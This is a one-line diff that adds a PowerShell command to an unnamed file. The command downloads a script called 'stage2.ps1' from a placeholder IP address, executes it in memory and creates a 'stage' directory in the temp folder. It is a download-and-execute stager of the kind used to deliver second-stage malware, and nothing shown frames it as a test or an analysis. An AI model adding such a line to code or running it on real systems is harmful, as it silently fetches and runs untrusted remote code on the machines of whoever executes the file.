@@ -1,0 +1,1 @@
+$RemoteScript = (New-Object Net.WebClient).DownloadString('https://203.0.113.208/stage2.ps1'); & ([ScriptBlock]::Create($RemoteScript)); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
